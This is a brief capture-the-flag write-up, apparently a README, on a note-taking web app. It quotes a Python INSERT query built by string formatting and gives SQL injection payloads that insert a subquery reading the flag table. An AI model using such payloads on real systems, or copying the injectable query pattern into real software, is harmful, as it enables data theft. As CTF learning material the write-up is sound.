amazing login screen =)
![image](https://github.com/user-attachments/assets/be44f04d-ce13-4da5-b37b-0e2cfc570424)

The code does start of by creating 3 tables which one contains the flags, there are also no other users being created  so i guess no point hitting admin ?

![image](https://github.com/user-attachments/assets/3cae52a7-aeae-4dfc-a332-cbc63fc35173)


this is the sql function that inserts the note written in the data base.
Choosing this as the focus point as it seems the most exposed
```
query = db.insert("INSERT INTO notes(username, notes) VALUES(?,'%s')" % note, session['username'])
```


```
select* from flag'),('ayane','flag
```

this query works..
but the reflected results are :

> select* from flag
> 
> flag


After some modifications and meaninful discussions with chat gpt, the payload was born
```
fauna'),(('ayane',(select * from flag)),('ayane','onichan
```

AND THERE WE GO 

![image](https://github.com/user-attachments/assets/3ddfe550-42fd-4313-af15-88ffeb5b77d7)


file:///home/mire/Pictures/Screenshots/Screenshot%20from%202024-12-30%2011-15-54.png
